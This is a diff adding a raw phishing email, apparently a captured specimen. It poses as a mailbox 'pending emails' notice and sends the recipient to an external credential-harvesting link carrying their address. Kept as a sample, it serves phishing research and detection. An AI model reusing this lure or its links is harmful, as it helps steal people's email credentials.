@@ -1,0 +1,118 @@
+Return-Path: noreply@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 77810695158.47.96BD922
+Received: from jax4mhob15.registeredsite.com (jax4mhob15.registeredsite.com
+ [64.69.218.103])	by imf08.b.hostedemail.com (Postfix) with ESMTP id
+ 2D3D718012B9C	for <jose@monkey.org>; Fri, 12 Feb 2021 20:05:19 +0000 (UTC)
+Received: from mymail.myregisteredsite.com
+ (jax4wmnode5f.mymail.myregisteredsite.com [209.237.134.225])	by
+ jax4mhob15.registeredsite.com (8.14.4/8.14.4) with ESMTP id 11CK5HnU110836
+	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO)	for
+ <jose@monkey.org>; Fri, 12 Feb 2021 15:05:18 -0500
+Received: (qmail 21641 invoked by uid 80); 12 Feb 2021 20:05:17 -0000
+Received: from 92.40.194.146.threembb.co.uk (HELO columnist.com)
+ (bogtrotter@bogtrotterusa.com@92.40.194.146)  by mymail.myregisteredsite.com
+ with ESMTPA; 12 Feb 2021 20:05:17 -0000
+From: "monkey.org"<noreply@monkey.org>
+To: jose@monkey.org
+Subject: Notification - MailBox has (3) Pending emails
+Date: 13 Feb 2021 04:05:14 +0800
+Message-ID: <20210213040514.7F6EA75DA59B209C@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=3.39
+X-Stat-Signature: 174fy7pqujjubr6afsqzi9rn1bfjemnj
+X-Rspamd-Queue-Id: 2D3D718012B9C
+X-Rspamd-Server: rspam03
+Received-SPF: none (monkey.org>: No applicable sender policy available)
+ receiver=imf08.b.tucows.com; identity=mailfrom;
+ envelope-from="<noreply@monkey.org>"; helo=jax4mhob15.registeredsite.com;
+ client-ip=64.69.218.103
+X-HE-DKIM-Result: none/none
+X-Spam-Summary: =?utf-8?q?50=2C0=2C0=2C812d6382ff5bad5d=2Cd41d8cd98f00b204?=
+ =?utf-8?q?=2Cnoreply=40monkey=2Eorg=2Cjose=40monkey=2Eorg=2CRULES=5FHIT=3A4?=
+ =?utf-8?b?MTo3MjozNTU6Mzc1OjM3OTo0OTU6ODAwOjk2Mjo5Njc6OTczOjk4Mzo5ODg6OTg5?=
+ =?utf-8?q?=3A1021=3A1133=3A1189=3A1208=3A1224=3A1260=3A1263=3A1311=3A1313?=
+ =?utf-8?q?=3A1314=3A1345=3A1381=3A1431=3A1433=3A1434=3A1436=3A1437=3A1513?=
+ =?utf-8?q?=3A1515=3A1516=3A1517=3A1521=3A1534=3A1542=3A1560=3A1571=3A1588?=
+ =?utf-8?q?=3A1589=3A1593=3A1594=3A1685=3A1711=3A1714=3A1719=3A1730=3A1747?=
+ =?utf-8?q?=3A1777=3A1792=3A2084=3A2194=3A2198=3A2199=3A2200=3A2393=3A2525?=
+ =?utf-8?q?=3A2560=3A2563=3A2682=3A2685=3A2828=3A2859=3A2933=3A2937=3A2939?=
+ =?utf-8?q?=3A2942=3A2945=3A2947=3A2951=3A2954=3A3022=3A3138=3A3139=3A3140?=
+ =?utf-8?q?=3A3141=3A3142=3A3867=3A3870=3A3873=3A3934=3A3936=3A3938=3A3941?=
+ =?utf-8?q?=3A3944=3A3947=3A3950=3A3953=3A3956=3A3959=3A4321=3A5007=3A6117?=
+ =?utf-8?q?=3A6119=3A6261=3A6650=3A6669=3A6671=3A6685=3A7653=3A7688=3A7809?=
+ =?utf-8?q?=3A7903=3A8516=3A8599=3A8603=3A9025=3A9060=3A9344=3A9388=3A9416?=
+ =?utf-8?q?=3A9468=3A9908=3A10004=3A10234=3A11473=3A11658=3A12043=3A12295=3A?=
+ =?utf-8?q?12297=3A12438=3A12522=3A12555=3A12740=3A12895=3A12955=3A12958=3A1?=
+ =?utf-8?q?2959=3A12967=3A12968=3A12986=3A13007=3A13139=3A13439=3A13868=3A14?=
+ =?utf-8?q?093=3A14096=3A14180=3A14181=3A14721=3A14822=3A14827=3A21060=3A210?=
+ =?utf-8?q?80=3A21212=3A21433=3A21436=3A21451=3A21483=3A21524=3A21611=3A2162?=
+ =?utf-8?q?7=3A21660=3A21731=3A21790=3A21819=3A21881=3A30026=3A30054=2C0=2CR?=
+ =?utf-8?b?Qkw6MjA5LjIzNy4xMzQuMjI1OkBtb25rZXkub3JnOmpvc2VAbW9ua2V5Lm9yZy5s?=
+ =?utf-8?q?bl8=2Emailshell=2E_net-64=2E201=2E201=2E201_62=2E0=2E0=2E100=3B04?=
+ =?utf-8?q?y8ai5nmth8gaykhr1a8wn75pbr6yfarf7ddxrxfgozubu3kcpy1n1cog4gthj=2Ef?=
+ =?utf-8?q?x1fztq1j8fb1ii13oyyihk94nz8t5h4mpj5pn6gyejqfhiwkpptfw11mu5catz=2E?=
+ =?utf-8?q?ers6q9ziyburak6cufchuumcjp9a-lbl8=2Emailshell=2Enet-223=2E238=2E2?=
+ =?utf-8?b?NTUuMTAwLENhY2hlSVA6bm9uZSxCYXllc2lhbjowLjUsMC41LDAuNSxOZXRjaGVj?=
+ =?utf-8?q?k=3Anone=2CDomainCache=3A0=2CMSF=3Anot_bulk=2CSPF=3Afu=2CMSBL=3A0?=
+ =?utf-8?b?LEROU0JMOm5ldXRyYWwsQ3VzdG9tX3J1bGVzOjA6MDowLExGdGltZToyOSxMVUFf?=
+ =?utf-8?q?SUMMARY=3Anone?=
+X-HE-Tag: 1613160319-462004
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 14
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em"><BR>
+<table style=3D"FONT-SIZE: 15px; HEIGHT: 90px; FONT-FAMILY: &quot;segoe ui&=
+quot;,arial,helvetica; BORDER-COLLAPSE: collapse; COLOR: rgb(0,0,0)" cellsp=
+acing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#0078d7">
+<TBODY>
+<TR style=3D"HEIGHT: 90px">
+<td style=3D"HEIGHT: 90px" bgcolor=3D"#0078d7" height=3D"90">
+<DIV style=3D'FONT-SIZE: 18px; FONT-FAMILY: "segoe ui light","segoe wp ligh=
+t","segoe ui",helvetica,arial,serif,emojifont; COLOR: rgb(255,255,255); PAD=
+DING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 30px; LI=
+NE-HEIGHT: normal; PADDING-RIGHT: 0px; font-variant-numeric: normal; font-v=
+ariant-east-asian: normal; font-stretch: normal'>
+<DIV style=3D"FONT-SIZE: 28px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
+NG-LEFT: 0px; MARGIN: 0px 0px 0px 10px; PADDING-RIGHT: 0px"><FONT style=3D"=
+VERTICAL-ALIGN: inherit"><BR>Notification</FONT></DIV></DIV></TD></TR></TBO=
+DY></TABLE>
+<DIV style=3D'FONT-SIZE: 15px; MARGIN-BOTTOM: 0px; FONT-FAMILY: "segoe ui",=
+"segoe wp",segoe,tahoma,"microsoft sans serif",verdana,sans-serif,serif,emo=
+jifont; MARGIN-TOP: 0px; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; DIRECTI=
+ON: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PADDING-RI=
+GHT: 0px; MARGIN-RIGHT: 0px'>
+<DIV style=3D"MARGIN-BOTTOM: 30px; MARGIN-TOP: 20px; PADDING-BOTTOM: 0px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; LINE-HEIGHT: 20px; PA=
+DDING-RIGHT: 0px">&nbsp;</DIV>
+<DIV style=3D'FONT-SIZE: 17px; FONT-FAMILY: "segoe ui","segoe ui light","se=
+goe wp light","segoe ui","segoe wp",segoe,tahoma,"microsoft sans serif",ver=
+dana,sans-serif,serif,emojifont; COLOR: rgb(0,120,215); PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; LINE-HEIGHT: 2=
+0px; PADDING-RIGHT: 0px; font-variant-numeric: normal; font-variant-east-as=
+ian: normal; font-stretch: normal'>Hi jose@monkey.org</DIV>
+<DIV style=3D"FONT-SIZE: 12px; MARGIN-BOTTOM: 30px; MARGIN-TOP: 0px; COLOR:=
+ rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN-LEFT: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px">You have 9 unrec=
+eived emails on 2/13/2021 4:05:14 a.m., this was caused due to a system del=
+ay, Rectify Below:&nbsp;<BR><BR>
+<A style=3D"BACKGROUND: rgb(0,120,215); COLOR: white; PADDING-BOTTOM: 5px; =
+PADDING-TOP: 5px; PADDING-LEFT: 5px; DISPLAY: block; PADDING-RIGHT: 5px" hr=
+ef=3D"https://authsrvr401-srvr22-1nfo587.web.app/?emailtoken=3Djose@monkey.=
+org&amp;domain=3Dmonkey.org" rel=3D"noopener noreferrer" target=3D_blank da=
+ta-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://dareammafizza.=
+com/allWEBs/?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16131=
+38632040000&amp;usg=3DAFQjCNED6tgSE9Dp8oyy8rK-lLBalDLa_g">
+View&nbsp;Pending Messages In Mail Saver.</A><BR><BR>Source:&nbsp;monkey.or=
+g&nbsp;Support</DIV></DIV></BODY></HTML>
+
